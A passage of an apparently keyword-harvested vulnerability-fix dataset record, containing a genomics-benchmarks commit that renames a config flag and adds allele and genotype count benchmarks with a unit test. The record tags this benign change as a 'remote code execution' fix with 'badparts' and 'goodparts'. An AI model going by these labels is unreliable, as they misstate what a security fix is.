generation\r\n\r\n* Update config unittests\r\n\r\n- test_config.py: Add two new unit tests to ensure that a file is not overwritten normally, and that a file is overwritten while using the overwrite flag\r\n\r\n* Add two files needed for data service unit testing and update .gitignore\r\n\r\n- Update .gitignore to only ignore root level data directory\r\n- Add two missing files needed for unit testing Data Service\r\n\r\n* WIP: Add VCF to Zarr conversion (currently only uses Blosc compressor with no user configuration availalbe)\r\n\r\n* FTP Bugfix: Create local directory if it does not exist, before trying to save files to local directory\r\n\r\n* VCF to Zarr: Take downloaded files (vcf, vcf.gz) and organize them to prepare for Zarr conversion during benchmark execution\r\n\r\n* core.py: Follow PEP8\r\n\r\n* Add ability to control VCF to Zarr conversion settings from configuration file (Blosc compressor only for now)\r\n\r\nAvailable Blosc compressor algorithms: zstd, blosclz, lz4, lz4hc, zlib, snappy\r\n\r\n* Convert VCF to Zarr during Setup mode\r\n\r\n- Restructure/add new folders for dataset storage\r\n- Add conversion of VCF files to Zarr format during Setup mode\r\n- data-service: Create function to remove directory tree\r\n- Various code cleanup/formatting\r\n\r\n* Add benchmarking configuration options and parsing\r\n\r\n*  - Move data directory declarations to a separate class in data_service\r\n - Add skeleton code to benchmark core\r\n\r\n* - cli.py: Use run_(timestamp) as default label for benchmark, pass label into benchmark core\r\n- config.py: Store VCF to Zarr conversion config data in Benchmark configuration data so that settings are known when running the benchmark\r\n- core.py: Begin implementation of benchmark process, create BenchmarkRunner class to time different tasks, add benchmarking of vcf to zarr conversion process, save benchmark results to psv file\r\n- data_service.py: Update benchmark_vcf_to_zarr function to have hooks for benchmark timing when needed\r\n- requirements.txt: Add pandas to list of requirements, which is used for storing benchmark results\r\n\r\n* Code cleanup and paramater documentation\r\n\r\n* Rename BenchmarkRunner to BenchmarkProfiler, create new Benchmark class to hold all benchmarking-related code\r\n\r\n- Rename BenchmarkRunner to BenchmarkProfiler class\r\n- Add two unittest method stubs\r\n- core.py: Move benchmarking process inside new Benchmark Class for better code organization/separation\r\n- core.py: Move record_runtime function to internal function within BenchmarkProfiler class\r\n\r\n* Implement unit tests for benchmark profiler and results data\r\n\r\n* Update comment for clarity\r\n\r\n* data_service: Create function that returns genotype data from callset\r\n  Supports data sets with differing formats (e.g. callset/GT vs. callset/genotype)\r\n\r\n* Bugfix: Use an OrderedDict instead of dict to contain benchmark results. Previously, order was not preserved on Linux- and Mac-based systems using Python 3.5\r\n\r\n* numcodecs: remove unused imports\r\n\r\n* Remove unused imports for module (resulting in circular references?)"}, "18609fa3b8b1e8cca95f1021d60750628abf7433": {"url": "https://api.github.com/repos/ornl-oxford/genomics-benchmarks/commits/18609fa3b8b1e8cca95f1021d60750628abf7433", "html_url": "https://github.com/ornl-oxford/genomics-benchmarks/commit/18609fa3b8b1e8cca95f1021d60750628abf7433", "sha": "18609fa3b8b1e8cca95f1021d60750628abf7433", "keyword": "remote code execution check", "diff": "diff --git a/genomics_benchmarks/config.py b/genomics_benchmarks/config.py\nindex cfefd95..fbb8e1b 100644\n--- a/genomics_benchmarks/config.py\n+++ b/genomics_benchmarks/config.py\n@@ -201,7 +201,7 @@ class BenchmarkConfigurationRepresentation:\n     benchmark_number_runs = 5\n     benchmark_data_input = \"vcf\"\n     benchmark_dataset = \"\"\n-    benchmark_allele_count = False\n+    benchmark_aggregations = False\n     benchmark_PCA = False\n     vcf_to_zarr_config = None\n \n@@ -225,8 +225,8 @@ def __init__(self, runtime_config=None):\n                         self.benchmark_data_input = benchmark_data_input_temp\n                 if \"benchmark_dataset\" in runtime_config.benchmark:\n                     self.benchmark_dataset = runtime_config.benchmark[\"benchmark_dataset\"]\n-                if \"benchmark_allele_count\" in runtime_config.benchmark:\n-                    self.benchmark_allele_count = config_str_to_bool(runtime_config.benchmark[\"benchmark_allele_count\"])\n+                if \"benchmark_aggregations\" in runtime_config.benchmark:\n+                    self.benchmark_aggregations = config_str_to_bool(runtime_config.benchmark[\"benchmark_aggregations\"])\n                 if \"benchmark_PCA\" in runtime_config.benchmark:\n                     self.benchmark_PCA = config_str_to_bool(runtime_config.benchmark[\"benchmark_PCA\"])\n \ndiff --git a/genomics_benchmarks/config/benchmark.conf.default b/genomics_benchmarks/config/benchmark.conf.default\nindex 2310dc2..381ec6d 100644\n--- a/genomics_benchmarks/config/benchmark.conf.default\n+++ b/genomics_benchmarks/config/benchmark.conf.default\n@@ -98,8 +98,9 @@ benchmark_data_input = vcf\n # Specifies which dataset to use for the benchmarking process.\n benchmark_dataset =\n \n-# Enables/disables running an allele count as part of the benchmarking process.\n-benchmark_allele_count = True\n+# Enables/disables running simple aggregations, such as allele count and genotype count, \n+# as part of the benchmarking process.\n+benchmark_aggregations = True\n \n # Enables Principal Component Analysis (PCA) as part of the benchmarking process.\n benchmark_PCA = False\ndiff --git a/genomics_benchmarks/core.py b/genomics_benchmarks/core.py\nindex a5a4665..e1682db 100644\n--- a/genomics_benchmarks/core.py\n+++ b/genomics_benchmarks/core.py\n@@ -140,12 +140,16 @@ def run_benchmark(self):\n                 # Ensure Zarr dataset exists and can be used for upcoming benchmarks\n                 benchmark_zarr_path = os.path.join(self.benchmark_zarr_dir, self.benchmark_zarr_file)\n                 if (benchmark_zarr_path != \"\") and (os.path.isdir(benchmark_zarr_path)):\n-                    # TODO: Run remaining benchmarks (e.g. loading into memory, allele counting, PCA, etc.)\n-                    pass\n+                    # Load Zarr dataset into memory\n+                    self._benchmark_load_zarr_dataset(benchmark_zarr_path)\n+\n+                    if self.bench_conf.benchmark_aggregations:\n+                        self._benchmark_simple_aggregations(benchmark_zarr_path)\n                 else:\n                     # Zarr dataset doesn't exist. Print error message and exit\n                     print(\"[Exec] Error: Zarr dataset could not be found for benchmarking.\")\n                     print(\"  - Zarr dataset location: {}\".format(benchmark_zarr_path))\n+                    exit(1)\n \n     def _benchmark_convert_to_zarr(self):\n         self.benchmark_zarr_dir = self.data_dirs.zarr_dir_benchmark\n@@ -161,7 +165,7 @@ def _benchmark_convert_to_zarr(self):\n             data_service.convert_to_zarr(input_vcf_path=input_vcf_path,\n                                          output_zarr_path=output_zarr_path,\n                                          conversion_config=self.bench_conf.vcf_to_zarr_config,\n-                                         benchmark_runner=self.benchmark_profiler)\n+                                         benchmark_profiler=self.benchmark_profiler)\n \n             self.benchmark_zarr_file = output_zarr_file\n         else:\n@@ -169,3 +173,44 @@ def _benchmark_convert_to_zarr(self):\n             print(\"  - Dataset file specified in configuration: {}\".format(input_vcf_file))\n             print(\"  - Expected file location: {}\".format(input_vcf_path))\n             exit(1)\n+\n+    def _benchmark_load_zarr_dataset(self, zarr_path):\n+        self.benchmark_profiler.start_benchmark(operation_name=\"Load Zarr Dataset\")\n+        store = zarr.DirectoryStore(zarr_path)\n+        callset = zarr.Group(store=store, read_only=True)\n+        self.benchmark_profiler.end_benchmark()\n+\n+    def _benchmark_simple_aggregations(self, zarr_path):\n+        # Load Zarr dataset\n+        store = zarr.DirectoryStore(zarr_path)\n+        callset = zarr.Group(store=store, read_only=True)\n+\n+        gtz = callset['calldata/GT']\n+\n+        # Setup genotype Dask array for computations\n+        gt = allel.GenotypeDaskArray(gtz)\n+\n+        # Run benchmark for allele count\n+        self.benchmark_profiler.start_benchmark(operation_name=\"Allele Count (All Samples)\")\n+        gt.count_alleles().compute()\n+        self.benchmark_profiler.end_benchmark()\n+\n+        # Run benchmark for genotype count (heterozygous per variant)\n+        self.benchmark_profiler.start_benchmark(operation_name=\"Genotype Count: Heterozygous per Variant\")\n+        gt.count_het(axis=1).compute()\n+        self.benchmark_profiler.end_benchmark()\n+\n+        # Run benchmark for genotype count (homozygous per variant)\n+        self.benchmark_profiler.start_benchmark(operation_name=\"Genotype Count: Homozygous per Variant\")\n+        gt.count_hom(axis=1).compute()\n+        self.benchmark_profiler.end_benchmark()\n+\n+        # Run benchmark for genotype count (heterozygous per sample)\n+        self.benchmark_profiler.start_benchmark(operation_name=\"Genotype Count: Heterozygous per Sample\")\n+        gt.count_het(axis=0).compute()\n+        self.benchmark_profiler.end_benchmark()\n+\n+        # Run benchmark for genotype count (homozygous per sample)\n+        self.benchmark_profiler.start_benchmark(operation_name=\"Genotype Count: Homozygous per Sample\")\n+        gt.count_hom(axis=0).compute()\n+        self.benchmark_profiler.end_benchmark()\ndiff --git a/genomics_benchmarks/data_service.py b/genomics_benchmarks/data_service.py\nindex c4481ae..2dcf8b4 100644\n--- a/genomics_benchmarks/data_service.py\n+++ b/genomics_benchmarks/data_service.py\n@@ -289,7 +289,7 @@ def setup_vcf_to_zarr(input_vcf_dir, output_zarr_dir, conversion_config):\n                         conversion_config=conversion_config)\n \n \n-def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config, benchmark_runner=None):\n+def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config, benchmark_profiler=None):\n     \"\"\" Converts the original data (VCF) to a Zarr format. Only converts a single VCF file.\n     If a BenchmarkRunner is provided, the actual VCF to Zarr conversion process will be benchmarked.\n     :param input_vcf_path: The input VCF file location\n@@ -311,10 +311,25 @@ def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config, benchma\n         # Get alt number\n         if conversion_config.alt_number is None:\n             print(\"[VCF-Zarr] Determining maximum number of ALT alleles by scaling all variants in the VCF file.\")\n+\n+            if benchmark_profiler is not None:\n+                benchmark_profiler.start_benchmark(operation_name=\"Read VCF file into memory for alt number\")\n+\n             # Scan VCF file to find max number of alleles in any variant\n             callset = allel.read_vcf(input_vcf_path, fields=['numalt'], log=sys.stdout)\n+\n+            if benchmark_profiler is not None:\n+                benchmark_profiler.end_benchmark()\n+\n             numalt = callset['variants/numalt']\n+\n+            if benchmark_profiler is not None:\n+                benchmark_profiler.start_benchmark(operation_name=\"Determine maximum alt number\")\n+\n             alt_number = np.max(numalt)\n+\n+            if benchmark_profiler is not None:\n+                benchmark_profiler.end_benchmark()\n         else:\n             print(\"[VCF-Zarr] Using alt number provided in configuration.\")\n             # Use the configuration-provided alt number\n@@ -340,15 +355,15 @@ def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config, benchma\n         else:\n             raise ValueError(\"Unexpected compressor type specified.\")\n \n-        if benchmark_runner is not None:\n-            benchmark_runner.start_benchmark(operation_name=\"Convert VCF to Zarr\")\n+        if benchmark_profiler is not None:\n+            benchmark_profiler.start_benchmark(operation_name=\"Convert VCF to Zarr\")\n \n         # Perform the VCF to Zarr conversion\n         allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True, fields=fields,\n                           log=sys.stdout, compressor=compressor, chunk_length=chunk_length, chunk_width=chunk_width)\n \n-        if benchmark_runner is not None:\n-            benchmark_runner.end_benchmark()\n+        if benchmark_profiler is not None:\n+            benchmark_profiler.end_benchmark()\n \n \n GENOTYPE_ARRAY_NORMAL = 0\ndiff --git a/tests/data/config_test_reading_runtime.conf b/tests/data/config_test_reading_runtime.conf\nindex 75a82ac..960e197 100644\n--- a/tests/data/config_test_reading_runtime.conf\n+++ b/tests/data/config_test_reading_runtime.conf\n@@ -25,7 +25,7 @@ blosc_shuffle_mode = -1\n benchmark_number_runs = 5\n benchmark_data_input = vcf\n benchmark_dataset =\n-benchmark_allele_count = True\n+benchmark_aggregations = True\n benchmark_PCA = False\n \n [output]\ndiff --git a/tests/test_cli.py b/tests/test_cli.py\nindex fe1208e..5e970d8 100644\n--- a/tests/test_cli.py\n+++ b/tests/test_cli.py\n@@ -35,7 +35,7 @@ def test_getting_command_arguments(self):\n         # Test group 2 -- setup\n         self.run_subparser_test(\"setup\", \"config_file\", \"./benhcmark.conf\")\n         # Test group 3 - Tests if it the argparser is setting default values \"\"\"\n-        self.run_subparser_test(\"exec\", \"config_file\", \"./benchmark.conf\")\n+        self.run_subparser_test(\"exec\",\"config_file\",\"./benchmark.conf\")\n \n     def test_parser_expected_failing(self):\n         \"\"\" Test that parsing fails on no command option (a choice of a subparser), or an unrecognized command (\"something\") \"\"\"\ndiff --git a/tests/test_core.py b/tests/test_core.py\nindex 2295e10..c3fd8ec 100644\n--- a/tests/test_core.py\n+++ b/tests/test_core.py\n@@ -1,7 +1,12 @@\n import unittest\n from genomics_benchmarks.core import *\n+from genomics_benchmarks.config import \\\n+    BenchmarkConfigurationRepresentation, \\\n+    VCFtoZarrConfigurationRepresentation, \\\n+    DataDirectoriesConfigurationRepresentation\n from time import sleep\n import os\n+import shutil\n \n \n class TestCoreBenchmark(unittest.TestCase):\n@@ -122,6 +127,87 @@ def test_benchmark_results_psv(self):\n         if os.path.exists(psv_file):\n             os.remove(psv_file)\n \n+    def test_benchmark_simple_aggregations(self):\n+        test_dir = './tests_temp/'\n+        benchmark_label = 'test_benchmark_simple_aggregations'\n+        psv_file = '{}.psv'.format(benchmark_label)\n+\n+        # Remove the test data directory from any previous unit tests\n+        if os.path.isdir(test_dir):\n+            shutil.rmtree(test_dir)\n+\n+        # Remove the PSV file from any previous unit tests\n+        if os.path.isfile(psv_file):\n+            os.remove(psv_file)\n+\n+        vcf_to_zar_config = VCFtoZarrConfigurationRepresentation()\n+        vcf_to_zar_config.enabled = True\n+\n+        bench_conf = BenchmarkConfigurationRepresentation()\n+        bench_conf.vcf_to_zarr_config = vcf_to_zar_config\n+        bench_conf.benchmark_number_runs = 1\n+        bench_conf.benchmark_data_input = 'vcf'\n+        bench_conf.benchmark_dataset = 'trio.2010_06.ychr.genotypes.vcf'\n+        bench_conf.benchmark_aggregations = True\n+\n+        data_dirs = DataDirectoriesConfigurationRepresentation()\n+        data_dirs.vcf_dir = './tests/data/'\n+        data_dirs.zarr_dir_setup = './tests_temp/zarr/'\n+        data_dirs.zarr_dir_benchmark = './tests_temp/zarr_benchmark/'\n+        data_dirs.temp_dir = './tests_temp/temp/'\n+\n+        # Run the benchmark and ensure nothing fails\n+        benchmark = Benchmark(bench_conf=bench_conf,\n+                              data_dirs=data_dirs,\n+                              benchmark_label='test_benchmark_simple_aggregations')\n+        benchmark.run_benchmark()\n+\n+        # Ensure psv file was created\n+        if os.path.exists(psv_file):\n+            # Read file contents\n+            with open(psv_file, 'r') as f:\n+                psv_lines = [line.rstrip('\\n') for line in f]\n+\n+            # Check line count of psv file\n+            num_lines = len(psv_lines)\n+            num_lines_expected = 10\n+            self.assertEqual(num_lines_expected, num_lines, msg='Unexpected line count in resulting psv file.')\n+\n+            psv_operation_names = []\n+\n+            for psv_line in psv_lines:\n+                line_split = psv_line.split('|')\n+                line_cols_actual = len(line_split)\n+                line_cols_expected = 4\n+\n+                # Ensure correct number of data columns exist for current line of data\n+                self.assertEqual(line_cols_expected, line_cols_actual,\n+                                 msg='Unexpected number of columns in resulting psv file')\n+\n+                operation_name = line_split[2]\n+                psv_operation_names.append(operation_name)\n+\n+            # Ensure all aggregations were run\n+            test_operation_names = ['Allele Count (All Samples)',\n+                                    'Genotype Count: Heterozygous per Variant',\n+                                    'Genotype Count: Homozygous per Variant',\n+                                    'Genotype Count: Heterozygous per Sample',\n+                                    'Genotype Count: Homozygous per Sample']\n+\n+            for test_operation_name in test_operation_names:\n+                if test_operation_name not in psv_operation_names:\n+                    self.fail(msg='Operation \\\"{}\\\" was not run during the benchmark.'.format(test_operation_name))\n+        else:\n+            self.fail(msg='Resulting psv file could not be found.')\n+\n+        # Remove the test data directory from any previous unit tests\n+        if os.path.isdir(test_dir):\n+            shutil.rmtree(test_dir)\n+\n+        # Remove the PSV file from this unit test\n+        if os.path.isfile(psv_file):\n+            os.remove(psv_file)\n+\n \n if __name__ == \"__main__\":\n     unittest.main()\n", "message": "", "files": {"/genomics_benchmarks/config.py": {"changes": [{"diff": "\n     benchmark_number_runs = 5\n     benchmark_data_input = \"vcf\"\n     benchmark_dataset = \"\"\n-    benchmark_allele_count = False\n+    benchmark_aggregations = False\n     benchmark_PCA = False\n     vcf_to_zarr_config = None\n \n", "add": 1, "remove": 1, "filename": "/genomics_benchmarks/config.py", "badparts": ["    benchmark_allele_count = False"], "goodparts": ["    benchmark_aggregations = False"]}, {"diff": "\n                         self.benchmark_data_input = benchmark_data_input_temp\n                 if \"benchmark_dataset\" in runtime_config.benchmark:\n                     self.benchmark_dataset = runtime_config.benchmark[\"benchmark_dataset\"]\n-                if \"benchmark_allele_count\" in runtime_config.benchmark:\n-                    self.benchmark_allele_count = config_str_to_bool(runtime_config.benchmark[\"benchmark_allele_count\"])\n+                if \"benchmark_aggregations\" in runtime_config.benchmark:\n+                    self.benchmark_aggregations = config_str_to_bool(runtime_config.benchmark[\"benchmark_aggregations\"])\n                 if \"benchmark_PCA\" in runtime_config.benchmark:\n                     self.benchmark_PCA = config_str_to_bool(runtime_config.benchmark[\"benchmark_PCA\"])\n ", "add": 2, "remove": 2, "filename": "/genomics_benchmarks/config.py", "badparts": ["                if \"benchmark_allele_count\" in runtime_config.benchmark:", "                    self.benchmark_allele_count = config_str_to_bool(runtime_config.benchmark[\"benchmark_allele_count\"])"], "goodparts": ["                if \"benchmark_aggregations\" in runtime_config.benchmark:", "                    self.benchmark_aggregations = config_str_to_bool(runtime_config.benchmark[\"benchmark_aggregations\"])"]}], "source": "\nfrom configparser import ConfigParser from shutil import copyfile import os.path from pkg_resources import resource_string from numcodecs import Blosc def config_str_to_bool(input_str): \"\"\" :param input_str: The input string to convert to bool value :type input_str: str :return: bool \"\"\" return input_str.lower() in['true', '1', 't', 'y', 'yes'] class DataDirectoriesConfigurationRepresentation: input_dir=\"./data/input/\" download_dir=input_dir +\"download/\" temp_dir=\"./data/temp/\" vcf_dir=\"./data/vcf/\" zarr_dir_setup=\"./data/zarr/\" zarr_dir_benchmark=\"./data/zarr_benchmark/\" def isint(value): try: int(value) return True except ValueError: return False def isfloat(value): try: float(value) return True except ValueError: return False class ConfigurationRepresentation(object): \"\"\" A small utility class for object representation of a standard config. file. \"\"\" def __init__(self, file_name): \"\"\" Initializes the configuration representation with a supplied file. \"\"\" parser=ConfigParser() parser.optionxform=str found=parser.read(file_name) if not found: raise ValueError(\"Configuration file{0} not found\".format(file_name)) for name in parser.sections(): dict_section={name: dict(parser.items(name))} self.__dict__.update(dict_section) class FTPConfigurationRepresentation(object): \"\"\" Utility class for object representation of FTP module configuration. \"\"\" enabled=False server=\"\" username=\"\" password=\"\" use_tls=False directory=\"\" files=[] def __init__(self, runtime_config=None): \"\"\" Creates an object representation of FTP module configuration data. :param runtime_config: runtime_config data to extract FTP settings from :type runtime_config: ConfigurationRepresentation \"\"\" if runtime_config is not None: if hasattr(runtime_config, \"ftp\"): if \"enabled\" in runtime_config.ftp: self.enabled=config_str_to_bool(runtime_config.ftp[\"enabled\"]) if \"server\" in runtime_config.ftp: self.server=runtime_config.ftp[\"server\"] if \"username\" in runtime_config.ftp: self.username=runtime_config.ftp[\"username\"] if \"password\" in runtime_config.ftp: self.password=runtime_config.ftp[\"password\"] if \"use_tls\" in runtime_config.ftp: self.use_tls=config_str_to_bool(runtime_config.ftp[\"use_tls\"]) if \"directory\" in runtime_config.ftp: self.directory=runtime_config.ftp[\"directory\"] if \"file_delimiter\" in runtime_config.ftp: delimiter=runtime_config.ftp[\"file_delimiter\"] else: delimiter=\"|\" if \"files\" in runtime_config.ftp: files_str=str(runtime_config.ftp[\"files\"]) if files_str==\"*\": self.files=[] else: self.files=files_str.split(delimiter) vcf_to_zarr_compressor_types=[\"Blosc\"] vcf_to_zarr_blosc_algorithm_types=[\"zstd\", \"blosclz\", \"lz4\", \"lz4hc\", \"zlib\", \"snappy\"] vcf_to_zarr_blosc_shuffle_types=[Blosc.NOSHUFFLE, Blosc.SHUFFLE, Blosc.BITSHUFFLE, Blosc.AUTOSHUFFLE] class VCFtoZarrConfigurationRepresentation: \"\"\" Utility class for object representation of VCF to Zarr conversion module configuration. \"\"\" enabled=False fields=None alt_number=None chunk_length=None chunk_width=None compressor=\"Blosc\" blosc_compression_algorithm=\"zstd\" blosc_compression_level=1 blosc_shuffle_mode=Blosc.AUTOSHUFFLE def __init__(self, runtime_config=None): \"\"\" Creates an object representation of VCF to Zarr Conversion module configuration data. :param runtime_config: runtime_config data to extract conversion configuration from :type runtime_config: ConfigurationRepresentation \"\"\" if runtime_config is not None: if hasattr(runtime_config, \"vcf_to_zarr\"): if \"enabled\" in runtime_config.vcf_to_zarr: self.enabled=config_str_to_bool(runtime_config.vcf_to_zarr[\"enabled\"]) if \"alt_number\" in runtime_config.vcf_to_zarr: alt_number_str=runtime_config.vcf_to_zarr[\"alt_number\"] if str(alt_number_str).lower()==\"auto\": self.alt_number=None elif isint(alt_number_str): self.alt_number=int(alt_number_str) else: raise TypeError(\"Invalid value provided for alt_number in configuration.\\n\" \"Expected: \\\"auto\\\" or integer value\") if \"chunk_length\" in runtime_config.vcf_to_zarr: chunk_length_str=runtime_config.vcf_to_zarr[\"chunk_length\"] if chunk_length_str==\"default\": self.chunk_length=None elif isint(chunk_length_str): self.chunk_length=int(chunk_length_str) else: raise TypeError(\"Invalid value provided for chunk_length in configuration.\\n\" \"Expected: \\\"default\\\" or integer value\") if \"chunk_width\" in runtime_config.vcf_to_zarr: chunk_width_str=runtime_config.vcf_to_zarr[\"chunk_width\"] if chunk_width_str==\"default\": self.chunk_width=None elif isint(chunk_width_str): self.chunk_width=int(chunk_width_str) else: raise TypeError(\"Invalid value provided for chunk_width in configuration.\\n\" \"Expected: \\\"default\\\" or integer value\") if \"compressor\" in runtime_config.vcf_to_zarr: compressor_temp=runtime_config.vcf_to_zarr[\"compressor\"] if compressor_temp in vcf_to_zarr_compressor_types: self.compressor=compressor_temp if \"blosc_compression_algorithm\" in runtime_config.vcf_to_zarr: blosc_compression_algorithm_temp=runtime_config.vcf_to_zarr[\"blosc_compression_algorithm\"] if blosc_compression_algorithm_temp in vcf_to_zarr_blosc_algorithm_types: self.blosc_compression_algorithm=blosc_compression_algorithm_temp if \"blosc_compression_level\" in runtime_config.vcf_to_zarr: blosc_compression_level_str=runtime_config.vcf_to_zarr[\"blosc_compression_level\"] if isint(blosc_compression_level_str): compression_level_int=int(blosc_compression_level_str) if(compression_level_int >=0) and(compression_level_int <=9): self.blosc_compression_level=compression_level_int else: raise ValueError(\"Invalid value for blosc_compression_level in configuration.\\n\" \"blosc_compression_level must be between 0 and 9.\") else: raise TypeError(\"Invalid value for blosc_compression_level in configuration.\\n\" \"blosc_compression_level could not be converted to integer.\") if \"blosc_shuffle_mode\" in runtime_config.vcf_to_zarr: blosc_shuffle_mode_str=runtime_config.vcf_to_zarr[\"blosc_shuffle_mode\"] if isint(blosc_shuffle_mode_str): blosc_shuffle_mode_int=int(blosc_shuffle_mode_str) if blosc_shuffle_mode_int in vcf_to_zarr_blosc_shuffle_types: self.blosc_shuffle_mode=blosc_shuffle_mode_int else: raise ValueError(\"Invalid value for blosc_shuffle_mode in configuration.\\n\" \"blosc_shuffle_mode must be a valid integer.\") else: raise TypeError(\"Invalid value for blosc_shuffle_mode in configuration.\\n\" \"blosc_shuffle_mode could not be converted to integer.\") benchmark_data_input_types=[\"vcf\", \"zarr\"] class BenchmarkConfigurationRepresentation: \"\"\" Utility class for object representation of the benchmark module's configuration. \"\"\" benchmark_number_runs=5 benchmark_data_input=\"vcf\" benchmark_dataset=\"\" benchmark_allele_count=False benchmark_PCA=False vcf_to_zarr_config=None def __init__(self, runtime_config=None): \"\"\" Creates an object representation of the Benchmark module's configuration data. :param runtime_config: runtime_config data to extract benchmark configuration from :type runtime_config: ConfigurationRepresentation \"\"\" if runtime_config is not None: if hasattr(runtime_config, \"benchmark\"): if \"benchmark_number_runs\" in runtime_config.benchmark: try: self.benchmark_number_runs=int(runtime_config.benchmark[\"benchmark_number_runs\"]) except ValueError: pass if \"benchmark_data_input\" in runtime_config.benchmark: benchmark_data_input_temp=runtime_config.benchmark[\"benchmark_data_input\"] if benchmark_data_input_temp in benchmark_data_input_types: self.benchmark_data_input=benchmark_data_input_temp if \"benchmark_dataset\" in runtime_config.benchmark: self.benchmark_dataset=runtime_config.benchmark[\"benchmark_dataset\"] if \"benchmark_allele_count\" in runtime_config.benchmark: self.benchmark_allele_count=config_str_to_bool(runtime_config.benchmark[\"benchmark_allele_count\"]) if \"benchmark_PCA\" in runtime_config.benchmark: self.benchmark_PCA=config_str_to_bool(runtime_config.benchmark[\"benchmark_PCA\"]) self.vcf_to_zarr_config=VCFtoZarrConfigurationRepresentation(runtime_config=runtime_config) def read_configuration(location): \"\"\" Args: location of the configuration file, existing configuration dictionary Returns: a dictionary of the form <dict>.<section>[<option>] and the corresponding values. \"\"\" config=ConfigurationRepresentation(location) return config def generate_default_config_file(output_location, overwrite=False): default_config_file_data=resource_string(__name__, 'config/benchmark.conf.default') if overwrite is None: overwrite=False if output_location is not None: if os.path.exists(output_location) and not overwrite: print( \"[Config] Could not generate configuration file: file exists at specified destination and overwrite mode disabled.\") return with open(output_location, 'wb') as output_file: output_file.write(default_config_file_data) if os.path.exists(output_location): print(\"[Config] Configuration file has been generated successfully.\") else: print(\"[Config] Configuration file was not generated.\") ", "sourceWithComments": "from configparser import ConfigParser\nfrom shutil import copyfile\nimport os.path\nfrom pkg_resources import resource_string\nfrom numcodecs import Blosc\n\n\ndef config_str_to_bool(input_str):\n    \"\"\"\n    :param input_str: The input string to convert to bool value\n    :type input_str: str\n    :return: bool\n    \"\"\"\n    return input_str.lower() in ['true', '1', 't', 'y', 'yes']\n\n\nclass DataDirectoriesConfigurationRepresentation:\n    input_dir = \"./data/input/\"\n    download_dir = input_dir + \"download/\"\n    temp_dir = \"./data/temp/\"\n    vcf_dir = \"./data/vcf/\"\n    zarr_dir_setup = \"./data/zarr/\"\n    zarr_dir_benchmark = \"./data/zarr_benchmark/\"\n\n\ndef isint(value):\n    try:\n        int(value)\n        return True\n    except ValueError:\n        return False\n\n\ndef isfloat(value):\n    try:\n        float(value)\n        return True\n    except ValueError:\n        return False\n\n\nclass ConfigurationRepresentation(object):\n    \"\"\" A small utility class for object representation of a standard config. file. \"\"\"\n\n    def __init__(self, file_name):\n        \"\"\" Initializes the configuration representation with a supplied file. \"\"\"\n        parser = ConfigParser()\n        parser.optionxform = str  # make option names case sensitive\n        found = parser.read(file_name)\n        if not found:\n            raise ValueError(\"Configuration file {0} not found\".format(file_name))\n        for name in parser.sections():\n            dict_section = {name: dict(parser.items(name))}  # create dictionary representation for section\n            self.__dict__.update(dict_section)  # add section dictionary to root dictionary\n\n\nclass FTPConfigurationRepresentation(object):\n    \"\"\" Utility class for object representation of FTP module configuration. \"\"\"\n    enabled = False  # Specifies whether the FTP module should be enabled or not\n    server = \"\"  # FTP server to connect to\n    username = \"\"  # Username to login with. Set username and password to blank for anonymous login\n    password = \"\"  # Password to login with. Set username and password to blank for anonymous login\n    use_tls = False  # Whether the connection should use TLS encryption\n    directory = \"\"  # Directory on FTP server to download files from\n    files = []  # List of files within directory to download. Set to empty list to download all files within directory\n\n    def __init__(self, runtime_config=None):\n        \"\"\"\n        Creates an object representation of FTP module configuration data.\n        :param runtime_config: runtime_config data to extract FTP settings from\n        :type runtime_config: ConfigurationRepresentation\n        \"\"\"\n        if runtime_config is not None:\n            # Check if [ftp] section exists in config\n            if hasattr(runtime_config, \"ftp\"):\n                # Extract relevant settings from config file\n                if \"enabled\" in runtime_config.ftp:\n                    self.enabled = config_str_to_bool(runtime_config.ftp[\"enabled\"])\n                if \"server\" in runtime_config.ftp:\n                    self.server = runtime_config.ftp[\"server\"]\n                if \"username\" in runtime_config.ftp:\n                    self.username = runtime_config.ftp[\"username\"]\n                if \"password\" in runtime_config.ftp:\n                    self.password = runtime_config.ftp[\"password\"]\n                if \"use_tls\" in runtime_config.ftp:\n                    self.use_tls = config_str_to_bool(runtime_config.ftp[\"use_tls\"])\n                if \"directory\" in runtime_config.ftp:\n                    self.directory = runtime_config.ftp[\"directory\"]\n\n                # Convert delimited list of files (string) to Python-style list\n                if \"file_delimiter\" in runtime_config.ftp:\n                    delimiter = runtime_config.ftp[\"file_delimiter\"]\n                else:\n                    delimiter = \"|\"\n\n                if \"files\" in runtime_config.ftp:\n                    files_str = str(runtime_config.ftp[\"files\"])\n                    if files_str == \"*\":\n                        self.files = []\n                    else:\n                        self.files = files_str.split(delimiter)\n\n\nvcf_to_zarr_compressor_types = [\"Blosc\"]\nvcf_to_zarr_blosc_algorithm_types = [\"zstd\", \"blosclz\", \"lz4\", \"lz4hc\", \"zlib\", \"snappy\"]\nvcf_to_zarr_blosc_shuffle_types = [Blosc.NOSHUFFLE, Blosc.SHUFFLE, Blosc.BITSHUFFLE, Blosc.AUTOSHUFFLE]\n\n\nclass VCFtoZarrConfigurationRepresentation:\n    \"\"\" Utility class for object representation of VCF to Zarr conversion module configuration. \"\"\"\n    enabled = False  # Specifies whether the VCF to Zarr conversion module should be enabled or not\n    fields = None\n    alt_number = None  # Alt number to use when converting to Zarr format. If None, then this will need to be determined\n    chunk_length = None  # Number of variants of chunks in which data are processed. If None, use default value\n    chunk_width = None  # Number of samples to use when storing chunks in output. If None, use default value\n    compressor = \"Blosc\"  # Specifies compressor type to use for Zarr conversion\n    blosc_compression_algorithm = \"zstd\"\n    blosc_compression_level = 1  # Level of compression to use for Zarr conversion\n    blosc_shuffle_mode = Blosc.AUTOSHUFFLE\n\n    def __init__(self, runtime_config=None):\n        \"\"\"\n        Creates an object representation of VCF to Zarr Conversion module configuration data.\n        :param runtime_config: runtime_config data to extract conversion configuration from\n        :type runtime_config: ConfigurationRepresentation\n        \"\"\"\n        if runtime_config is not None:\n            # Check if [vcf_to_zarr] section exists in config\n            if hasattr(runtime_config, \"vcf_to_zarr\"):\n                # Extract relevant settings from config file\n                if \"enabled\" in runtime_config.vcf_to_zarr:\n                    self.enabled = config_str_to_bool(runtime_config.vcf_to_zarr[\"enabled\"])\n                if \"alt_number\" in runtime_config.vcf_to_zarr:\n                    alt_number_str = 